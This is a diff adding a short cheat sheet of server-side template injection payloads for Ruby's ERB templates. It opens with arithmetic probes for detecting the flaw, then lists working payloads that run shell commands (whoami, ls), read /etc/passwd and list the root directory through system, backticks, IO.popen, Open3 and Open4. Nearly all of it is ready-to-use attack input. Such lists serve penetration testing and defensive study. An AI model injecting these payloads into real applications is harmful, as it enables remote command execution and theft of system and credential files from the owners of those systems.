@@ -1,0 +1,14 @@
+ERB (Ruby)
+{{7*7}} = {{7*7}}
+${7*7} = ${7*7}
+<%= 7*7 %> = 49
+<%= foobar %> = Error
+<%= system("whoami") %> #Execute code
+<%= Dir.entries('/') %> #List folder
+<%= File.open('/etc/passwd').read %> #Read file
+
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
